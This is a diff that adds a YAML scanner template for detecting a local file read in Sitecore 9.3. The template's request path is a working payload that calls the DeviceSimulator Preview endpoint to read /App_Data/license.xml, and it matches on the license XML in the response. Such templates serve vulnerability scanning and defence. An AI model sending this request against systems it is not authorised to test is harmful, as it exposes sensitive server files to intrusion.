@@ -1,0 +1,30 @@
+id: "sitecore-lfi"
+name: "Sitecore 9.3 - Webroot File Read"
+severity: "high"
+description: "SiteCore 9.3 is vulnerable to LFI."
+tech:
+  - "generic"
+tags:
+  - "sitecore"
+  - "lfi"
+  - "misconfig"
+  - "vuln"
+reference: "https://blog.assetnote.io/2023/05/10/sitecore-round-two/"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/api/sitecore/Sitecore.Mvc.DeviceSimulator.Controllers.SimulatorController,Sitecore.Mvc.DeviceSimulator.dll/Preview?previewPath=/App_Data/license.xml"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "<signedlicense id="
+      - "<Signature"
+    condition: "and"
+  - type: "status"
+    status:
+      - 200
